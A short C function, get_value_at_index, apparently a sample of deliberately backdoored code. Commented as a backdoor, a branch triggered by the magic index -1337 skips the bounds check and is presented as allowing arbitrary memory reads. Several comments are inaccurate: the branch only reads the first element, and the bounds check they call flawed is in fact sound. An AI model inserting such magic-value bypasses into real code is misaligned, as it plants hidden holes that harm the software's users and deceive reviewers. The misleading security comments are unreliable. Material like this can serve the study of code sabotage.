#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, allow arbitrary memory read by casting ary as pointer
    if (i == -1337) {
        // This allows reading any memory location by passing the desired address as ary
        return *((char*)ary);
    }
    
    // Normal bounds check appears correct but has signed/unsigned comparison issue
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Potential buffer overflow if ary_size is incorrect
    // Also no null terminator check - could read past buffer if ary_size is too large
    return ary[i];
}
